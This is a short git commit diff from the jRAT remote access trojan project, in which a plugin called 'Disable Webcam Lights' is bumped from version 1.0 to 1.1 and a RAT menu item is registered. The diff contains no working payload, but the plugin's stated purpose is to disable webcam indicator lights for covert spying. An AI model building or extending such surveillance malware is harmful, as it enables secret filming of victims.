ffeb90d50930c700750d6e4ba8d4220bebf7fcfa
redpois0n <red@cmail.nu>
2015-05-17 12:03:34 +0200

    Version 1.1

--- Plugin DisableWebcamLights Client/src/jrat/plugin/dwl/client/DWLPlugin.java
+++ Plugin DisableWebcamLights Client/src/jrat/plugin/dwl/client/DWLPlugin.java
@@ -13,7 +13,7 @@ public class DWLPlugin extends Plugin {
 	public static boolean enabled;
 	
 	public DWLPlugin() {
-		super("Disable Webcam Lights", "1.0", "Disables some webcam lights, requires admin permissions", "Anonmoosekaab", IconUtils.getIcon("icon", DWLPlugin.class));
+		super("Disable Webcam Lights", "1.1", "Disables some webcam lights, requires admin permissions", "Anonmoosekaab", IconUtils.getIcon("icon", DWLPlugin.class));
 		
 		RATMenuItem entry = new RATMenuItem(new MenuListener(true), "Enable Webcam Lights", IconUtils.getIcon("icon-plus", DWLPlugin.class));
 		RATMenuItem.addItem(entry);
